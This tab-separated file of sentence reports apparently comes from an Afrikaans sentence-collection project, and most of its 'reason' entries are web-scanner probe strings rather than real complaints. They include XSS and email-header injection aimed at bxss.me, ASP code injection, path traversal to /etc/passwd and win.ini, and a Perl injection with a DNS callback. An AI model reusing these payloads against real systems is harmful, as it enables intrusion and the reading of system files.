sentence_id	sentence	locale	reason
2af52e8431ccb92ecffb61b0a0a3a6a8b40a5718634cb802118488abf6ef32da	Die potensiële verskil wat deur elektromagnetisme veroorsaak word, wat 'n stroom laat vloei.	af	Die sin, na die komma, maak nie sin nie
3dd5e15b3f8027e85b74f601e77e8ecbeae94a757a2cbf98637042bdaf872472	Bespreking van die storie en skryfaktiwiteit gebaseer op die agtergrond, karakters en intrige.	af	Sin maak nie sin as ‘n enkeling nie
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	HttP://bxss.me/t/xss.html?%00
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	bxss.me/t/xss.html?%00
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	DB591p3r
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language%0abcc:009247.29801-1459.29801.3e44b.20178.2@bxss.me
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	response.write(9959031*9751800)
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	to@example.com>%0d%0abcc:009247.29801-1460.29801.3e44b.20178.2@bxss.me
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	'+response.write(9959031*9751800)+'
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	"+response.write(9959031*9751800)+"
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	../../../../../../../../../../../../../../etc/passwd
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	../../../../../../../../../../../../../../windows/win.ini
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	file:///etc/passwd
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	offensive-language
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	../offensive-language
00566e897a037bedb38259bba884b228242551b29fccc0e6341808329fe65c5f	Tegnologie het verlede jaar idees vir die nuwe Landswapen van die publiek gevra.	af	'.gethostbyname(lc('hitjb'.'xveunknm14d7d.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(101).chr(74).chr(110).chr(75).'
